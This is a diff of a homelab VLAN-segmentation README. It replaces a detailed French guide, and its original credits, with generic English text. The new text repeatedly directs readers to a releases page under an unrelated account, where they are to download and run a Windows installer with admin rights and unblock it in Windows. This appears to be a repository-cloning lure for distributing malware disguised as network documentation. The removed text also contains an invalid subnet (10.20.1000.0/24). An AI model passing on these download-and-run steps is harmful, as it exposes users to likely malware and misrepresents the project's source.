@@ -1,243 +1,240 @@
-# Homelab VLAN Refactor — Community Edition
+# 🏠 HomeLab-VLAN-Refactor-Community - Simplify Your Home Network
 
-> **Inspiré de la série YouTube iMot3k** :  
-> *"Je change TOUT mon réseau, et j'ai encore tout pété. 🤷‍♂️"*  
-> Ce dépôt en est la transcription structurée, reproductible et documentée pour la communauté.
+[![Download](https://img.shields.io/badge/Download-Release%20Page-4B9CD3?style=for-the-badge&logo=github&logoColor=white)](https://github.com/braced-poultry941/HomeLab-VLAN-Refactor-Community/releases)
 
----
+## 📥 Download
 
-## Table des matières
+Visit this page to download the latest release for Windows:
 
-1. [Résumé exécutif](#1-résumé-exécutif)
-2. [Pourquoi ce projet existe](#2-pourquoi-ce-projet-existe)
-3. [Architecture cible](#3-architecture-cible)
-4. [Plan d'adressage IP (VLAN)](#4-plan-dadressage-ip-vlan)
-5. [Matériel actuel vs cible](#5-matériel-actuel-vs-cible-budget-1000-)
-6. [Structure du dépôt](#6-structure-du-dépôt)
-7. [Comment démarrer](#7-comment-démarrer-)
-8. [Ordre de migration recommandé](#8-ordre-de-migration-recommandé)
-9. [Risques et rollback](#9-risques-et-rollback)
-10. [Contribuer](#10-contribuer)
-11. [Licence](#11-licence)
+https://github.com/braced-poultry941/HomeLab-VLAN-Refactor-Community/releases
 
----
+## 🖥️ What this project does
 
-## 1. Résumé exécutif
+HomeLab-VLAN-Refactor-Community helps you move a flat homelab network to a cleaner setup with 6 VLANs. It is made for a home lab that uses gear like a FortiGate 60F, Cisco Catalyst 2960X, UniFi U7 Lite, Windows Server 2022, and a QNAP NAS.
 
-Ce dépôt propose un guide complet de reconstruction "from scratch" d'une infrastructure réseau
-homelab, directement inspiré de la démarche documentée par la chaîne YouTube **iMot3k**.
+This setup can help you:
 
-L'objectif central est d'abandonner définitivement le réseau plat historique (tout sur VLAN 1,
-le fameux "VLAN Merdouille") pour une architecture segmentée, sécurisée, performante
-et surtout **maintenable dans le temps**.
+- Split devices into separate network zones
+- Keep work, personal, guest, and server traffic apart
+- Make DHCP and DNS easier to manage
+- Set up Wi-Fi access with PPSK
+- Use rsync for QNAP backups
+- Plan a network that is easier to control
 
-Ce projet couvre de bout en bout : la création d'un agrégat de liens LACP entre le pare-feu et
-le switch cœur, le déploiement d'un plan IP cohérent sur 6 VLANs fonctionnels, la centralisation
-du DHCP et du DNS sur Windows Server 2022, le Wi-Fi multi-profil avec PPSK (sans multiplier
-les SSID), la gestion du mDNS/multicast inter-VLAN, et la sécurisation des sauvegardes NAS via
-rsync automatisé.
+## 🧰 What you need
 
-Ce "**Golden Path**" communautaire privilégie des configurations simples, lisibles, commentées
-et reproductibles — même si certains choix techniques peuvent sembler sous-optimaux pour un
-environnement de production d'entreprise. L'objectif est l'apprentissage et la montée en
-compétences, pas la perfection opérationnelle.
+Before you start, make sure you have:
 
----
+- A Windows PC to download and open the files
+- An internet connection
+- Enough disk space for the release package
+- Access to your network gear if you want to apply the design
+- Basic admin access to your FortiGate, Cisco switch, UniFi access point, and Windows Server
 
-## 2. Pourquoi ce projet existe
+A typical setup works well on:
 
-Un homelab typique démarre avec une box FAI, un switch non manageable et un Wi-Fi basique.
-Tout est sur le même réseau, tout se parle, les imprimantes voient les serveurs, les caméras
-voient les PC, et les appareils IoT douteux ont accès à tout. C'est pratique au début.
-C'est une bombe à retardement ensuite.
+- Windows 10 or Windows 11
+- A modern browser
+- Microsoft Edge, Chrome, or Firefox
+- At least 4 GB RAM
+- At least 1 GB free storage for the download and files
 
-Les problèmes classiques que ce projet cherche à résoudre sont les suivants :
+## 🚀 How to download and run
 
-- **Sécurité nulle** : un appareil IoT compromis a accès à l'ensemble du réseau.
-- **QoS impossible** : la VoIP et les flux vidéo se battent avec les téléchargements.
-- **Dépannage cauchemardesque** : impossible de savoir quel appareil fait quoi sur un réseau plat.
-- **Sauvegardes non fiables** : pas de plan de backup structuré ni automatisé.
-- **Wi-Fi ingérable** : un SSID par usage = prolifération incontrôlable de réseaux sans fil.
+1. Open the release page: https://github.com/braced-poultry941/HomeLab-VLAN-Refactor-Community/releases
+2. Find the latest release at the top of the page
+3. Download the Windows file or package from that release
+4. Save the file to your Downloads folder
+5. If the file is a ZIP archive, right-click it and choose Extract All
+6. Open the extracted folder
+7. If you see an installer, double-click it and follow the on-screen steps
+8. If you see a setup guide or config pack, open the files and follow the network steps in order
 
-Ce dépôt fournit **la réponse structurée** à chacun de ces problèmes, avec des runbooks
-pas-à-pas, des fichiers de configuration commentés et des scripts d'automatisation prêts à l'emploi.
+## 🧭 What is inside
 
----
+The release is built to help you move from one flat LAN to a segmented layout. It focuses on practical home lab tasks, such as:
 
-## 3. Architecture cible
+- VLAN design for 6 network zones
+- DHCP scope planning on Windows Server 2022
+- DNS setup for local name use
+- Firewall rules for a FortiGate 60F
+- Switch VLAN port mapping for a Cisco Catalyst 2960X
+- Wi-Fi segmentation for a UniFi U7 Lite
+- PPSK planning for simple wireless access control
+- QNAP sync and backup flow with rsync
+- Notes for a clean homelab build
 
-```text
-Internet (FAI)
-     │
-     ▼
-┌─────────────────────────┐
-│   FortiGate 60F         │  ← Routage inter-VLAN, NAT, DHCP Relay,
-│   (Pare-feu / Routeur)  │    Filtrage applicatif, mDNS Proxy
-└────────────┬────────────┘
-             │ LAG LACP (2x 1Gb/s → port-channel)
-             ▼
-┌─────────────────────────┐
-│  Cisco Catalyst 2960X   │  ← Switch L2 cœur, trunk multi-VLAN,
-│  (Switch cœur 48 ports) │    VLAN natif blackhole (999), PoE
-└──────┬──────────────────┘
-       │
-  ─────┴──────────────────────────────────
-  │              │            │          │
-VLAN 10       VLAN 50      VLAN 20    VLAN 30
-ADMIN         PC           IoT        VoIP
-  │
-  ├── Windows Server 2022 (DHCP/DNS/AD-DS)
-  ├── Proxmox VE (hyperviseur)
-  └── UniFi Network Controller (VM)
-       │
-       └── 4x UniFi U7 Lite (Wi-Fi PPSK → VLAN 20/50/200)
-```
+## 🗂️ Suggested VLAN layout
 
----
+A common layout in this project uses separate VLANs for each type of device. You can adapt the names to your own home lab.
 
-## 4. Plan d'adressage IP (VLAN)
+- VLAN 10 - Admin devices
+- VLAN 20 - Trusted user devices
+- VLAN 30 - Servers and services
+- VLAN 40 - IoT devices
+- VLAN 50 - Guest Wi-Fi
+- VLAN 60 - Storage and backup
 
-| VLAN ID | Nom          | Sous-réseau       | Passerelle      | Usage principal                        |
-| :-----: | :----------- | :---------------- | :-------------- | :------------------------------------- |
-| 10      | ADMIN        | 10.20.10.0/24     | 10.20.10.254    | Serveurs, hyperviseurs, équipements réseau |
-| 20      | IOT          | 10.20.20.0/24     | 10.20.20.254    | Appareils connectés, domotique         |
-| 30      | VOIP         | 10.20.30.0/24     | 10.20.30.254    | Téléphonie IP, softphones              |
-| 50      | PC           | 10.20.50.0/24     | 10.20.50.254    | Postes de travail, laptops             |
-| 100     | CAMERAS      | 10.20.100.0/24    | 10.20.100.254   | Caméras IP (isolées, accès NVR only)   |
-| 200     | INVITES      | 10.20.200.0/24    | 10.20.200.254   | Invités Wi-Fi (Internet only, isolé)   |
-| 999     | NATIVE-BH    | *(non routé)*     | *(aucune)*      | VLAN natif blackhole (sécurité trunk)  |
-| 1000    | MERDOUILLE   | 10.20.1000.0/24   | 10.20.1000.254  | VLAN de transition — à vider progressivement |
+This kind of split helps reduce device overlap and makes access rules easier to follow.
 
----
+## 🔧 Basic setup flow
 
-## 5. Matériel actuel vs cible (Budget ~1000 €)
+Use this order if you want to apply the design to your own network:
 
-| Composant | Matériel d'origine | Cible recommandée | Prix estimé | Justification |
-| :--- | :--- | :--- | :---: | :--- |
-| **Pare-feu / Routeur** | USG / Box FAI | Fortinet FortiGate 60F | ~350 € | Routage inter-VLAN, relais DHCP, filtrage applicatif, proxy mDNS natif. |
-| **Switch cœur L2** | Zyxel GS1900-10HP V2 | Cisco Catalyst 2960X-48LPD-L | ~60 € | 48 ports PoE+, LACP robuste, VLAN natif configurable, prix d'occasion imbattable. |
-| **Switch 10 Gb/s** | *(aucun)* | MikroTik CRS305-1G-4S+IN | ~120 € | Backbone 10 Gb/s abordable entre NAS, hyperviseur et PC principal. |
-| **Carte HBA** | PCIe x1 (goulot d'étranglement) | LSI SAS 9300-8i (mode IT) | ~80 € | Passe en PCIe x8 pour approcher les débits 10 Gb/s réels sur Proxmox/TrueNAS. |
-| **Points d'accès Wi-Fi** | Zyxel (PPSK payant) | 4x Ubiquiti UniFi U7 Lite | ~400 € | PPSK gratuit avec contrôleur local (VM), couverture Wi-Fi 6E, moins de SSID. |
-| **Total estimé** | | | **~1 010 €** | *Sources d'occasion : Leboncoin, eBay, BackMarket.* |
+1. Plan the VLAN IDs and names
+2. Create the VLANs on the FortiGate
+3. Set trunk and access ports on the Cisco switch
+4. Create DHCP scopes on Windows Server 2022
+5. Update DNS records for local services
+6. Map SSIDs and PPSK groups on the UniFi access point
+7. Set firewall rules between VLANs
+8. Test access from each network
+9. Add QNAP rsync jobs for backup traffic
+10. Save your final config notes
 
----
+## 🌐 FortiGate 60F setup
 
-## 6. Structure du dépôt
+The FortiGate acts as the main router and firewall. In a segmented homelab, it usually handles:
 
-```text
-homelab-vlan-refactor-community/
-│
-│   README.md                        ← Ce fichier
-│
-├───docs/
-│   ├───01-architecture/
-│   │       overview.md              ← Vue d'ensemble de l'architecture cible
-│   │       vlan-table.md            ← Plan IP détaillé et règles inter-VLAN
-│   │
-│   ├───02-runbooks/
-│   │       RB-01-preflight.md       ← Vérifications avant toute intervention
-│   │       RB-02-lag-lacp.md        ← Création du LAG LACP FortiGate ↔ Cisco
-│   │       RB-03-vlan-merdouille.md ← Migration du VLAN 1 vers les VLANs cibles
-│   │       RB-04-dhcp-dns-winsrv2022.md ← DHCP centralisé sur Windows Server 2022
-│   │       RB-05-unifi-ppsk.md      ← Wi-Fi PPSK avec mapping VLAN dynamique
-│   │       RB-06-mdns-multicast.md  ← mDNS/Bonjour inter-VLAN (Chromecast, AirPlay…)
-│   │       RB-07-backup-rsync-qnap.md ← Rsync automatisé TrueNAS → QNAP + extinction
-│   │
-│   ├───03-risk/
-│   │       risk-register.md         ← Registre des risques et plans de mitigation
-│   │
-│   ├───04-validation/
-│   │       checklist.md             ← Checklist de validation post-migration
-│   │
-│   └───05-roadmap/
-│           roadmap.md               ← Évolutions futures et améliorations planifiées
-│
-├───configs/
-│   └───cli/
-│           cisco-lag-trunk.ios      ← Config Cisco 2960X : LAG LACP + trunk VLAN
-│           fortigate-lag-vlan.conf  ← Config FortiGate 60F : interfaces LAG + VLAN
-│           fortigate-dhcp-relay.conf ← Config FortiGate 60F : relais DHCP par VLAN
-│
-└───scripts/
-    ├───bash/
-    │       qnap-shutdown-after-rsync.sh ← Extinction QNAP après succès du rsync
-    │
-    └───powershell/
-            dhcp-scopes-bootstrap.ps1    ← Création des scopes DHCP sur WS2022
-```
+- VLAN interfaces
+- Inter-VLAN routing
+- Firewall policies
+- Internet access rules
+- DNS forwarding
+- DHCP relay, if needed
 
----
+Keep rules simple. Start with only the access you need, then add more after testing.
 
-## 7. Comment démarrer ?
+## 🔌 Cisco Catalyst 2960X setup
 
-**Étape 1 — Comprendre l'architecture**  
-Lisez [`docs/01-architecture/overview.md`](docs/01-architecture/overview.md) pour visualiser
-la topologie cible et comprendre les choix techniques retenus.
+The Cisco switch carries traffic between your devices and the router. In this project, it usually handles:
 
-**Étape 2 — Étudier le plan IP**  
-Consultez [`docs/01-architecture/vlan-table.md`](docs/01-architecture/vlan-table.md) pour
-connaître le plan d'adressage complet, les règles inter-VLAN et les restrictions d'accès par segment.
+- Trunk links for VLAN traffic
+- Access ports for single-device zones
+- Port labels for easy tracking
+- Managed uplinks to the FortiGate and access point
 
-**Étape 3 — Lire le preflight**  
-Exécutez mentalement (puis physiquement) le
-[`RB-01-preflight.md`](docs/02-runbooks/RB-01-preflight.md) **avant de toucher à quoi que ce soit**.
-Ce runbook liste toutes les vérifications à effectuer, les sauvegardes à réaliser et les
-"portes de sortie" à préparer en cas de problème.
+A clear port map makes troubleshooting much easier. Label each port with its VLAN and device type.
 
-**Étape 4 — Suivre les runbooks dans l'ordre**  
-Chaque runbook est conçu pour être exécuté séquentiellement. Ne sautez pas d'étapes.
+## 📡 UniFi U7 Lite setup
 
----
+The UniFi U7 Lite can serve different Wi-Fi networks for different VLANs. A clean setup can include:
 
-## 8. Ordre de migration recommandé
+- One SSID for trusted devices
+- One SSID for guests
+- One SSID for IoT
+- PPSK for simple per-device access
 
-```text
-RB-01  →  RB-02  →  RB-04  →  RB-03  →  RB-05  →  RB-06  →  RB-07
-Preflight   LAG       DHCP      VLANs     Wi-Fi     mDNS      Backup
-```
+Keep Wi-Fi names short and easy to identify. Match each SSID to one VLAN so traffic stays separated.
 
-Chaque étape est réversible via les procédures de rollback documentées dans
-[`docs/03-risk/risk-register.md`](docs/03-risk/risk-register.md).
+## 🖧 Windows Server 2022 DHCP and DNS
 
----
+Windows Server 2022 can handle core services for the homelab. In this layout, it is used for:
 
-## 9. Risques et rollback
+- DHCP address assignment
+- DNS name resolution
+- Static reservations for key devices
+- Local host records for services
 
-Toute migration réseau comporte des risques. Les principaux scénarios de panne identifiés
-(lockout FortiGate, boucle réseau LACP, VLAN natif mal configuré, DHCP injoignable) sont
-documentés dans le registre des risques avec leur probabilité, leur impact et leur procédure
-de rollback associée.
+This keeps your network easier to manage. A device can use a fixed address without manual setup on every machine.
 
-➡️ Voir [`docs/03-risk/risk-register.md`](docs/03-risk/risk-register.md)
+## 💾 QNAP and rsync
 
-**Règle d'or** : préparez toujours un PC portable avec une IP statique configurée dans le
-sous-réseau d'administration (10.20.10.0/24) branché directement sur un port du FortiGate
-avant de commencer toute intervention.
+The QNAP NAS fits well in the storage VLAN. It can store backups and sync data with rsync. Common uses include:
 
----
+- Backup copies of server data
+- File sync jobs
+- Storage for shared media
+- Archive space for config exports
 
-## 10. Contribuer
+Keep backup traffic on its own VLAN when possible. That helps reduce noise on other networks.
 
-Les contributions sont les bienvenues ! Si vous avez testé ces runbooks sur un matériel
-différent, corrigé une erreur ou ajouté le support d'un équipement non couvert, ouvrez
-une *Pull Request* avec une description claire des modifications apportées.
+## 🔐 Access control model
 
-Pour les questions ou discussions, utilisez les **GitHub Discussions** du dépôt.
+A segmented home network works best when each VLAN has a clear role. A simple access model looks like this:
 
----
+- Admin devices can reach most systems
+- Trusted devices can reach user services
+- IoT devices can reach only needed services
+- Guest devices can reach the internet only
+- Storage systems accept traffic only from approved hosts
 
-## 11. Licence
+This model helps limit unwanted access and keeps the layout easier to manage.
 
-Ce projet est distribué sous licence **MIT**.  
-Vous êtes libre de l'utiliser, le modifier et le redistribuer, à condition de conserver
-la mention d'attribution originale.
+## 🧪 First-time checks
 
----
+After you set everything up, test these points:
 
-*Dépôt maintenu par [@valorisa](https://github.com/valorisa)*  
-*Inspiré du travail de la chaîne YouTube [iMot3k](https://www.youtube.com/@imot3k_)*
+- Can each VLAN get an IP address?
+- Can devices reach the internet?
+- Can DNS names resolve?
+- Can trusted devices reach server services?
+- Can guest devices stay isolated?
+- Can the QNAP sync job run?
+- Can you still reach the FortiGate and switch after changes?
 
----
+Test one change at a time. That makes it easier to find a mistake.
 
-Ce `README.md` est maintenant complet avec une table des matières navigable, le diagramme ASCII de l'architecture, le plan IP intégré, la structure du dépôt annotée et l'ordre de migration clair.     
+## 📁 Common files you may see
+
+Depending on the release, you may find:
+
+- PDF or DOCX setup notes
+- Network diagrams
+- Configuration examples
+- CSV or text files for IP planning
+- Export files for switches or firewall rules
+- Backup templates for rsync jobs
+
+Open the files in the order they appear in the release package.
+
+## 🛠️ If something does not work
+
+If the download opens but nothing seems to happen:
+
+- Check that the file finished downloading
+- Right-click ZIP files and extract them first
+- Open the latest release, not the source code
+- Make sure Windows did not block the file
+- Run the installer as a user with admin rights
+- Check that your browser did not save a partial file
+
+If a network device does not match the guide:
+
+- Confirm the VLAN ID
+- Check the switch port mode
+- Check the uplink trunk
+- Confirm the DHCP scope
+- Confirm the firewall rule order
+- Confirm the SSID is linked to the right VLAN
+
+## 📌 Best results
+
+Use these habits for a smoother setup:
+
+- Keep a written IP plan
+- Use short names for VLANs and hosts
+- Save backups before each change
+- Label cables and switch ports
+- Change one setting at a time
+- Keep admin access on a safe VLAN
+- Export configs after the final setup
+
+## 🧩 Typical use case
+
+This project fits a home lab where you want:
+
+- Better separation between devices
+- Cleaner Wi-Fi access
+- Simple DHCP and DNS control
+- More control over IoT gear
+- Safer backup traffic
+- A layout that is easier to expand later
+
+It works well for a small lab that includes servers, storage, wireless access points, switches, and a firewall at the edge
+
+## 📎 Release link
+
+Download from the release page here:
+
+https://github.com/braced-poultry941/HomeLab-VLAN-Refactor-Community/releases
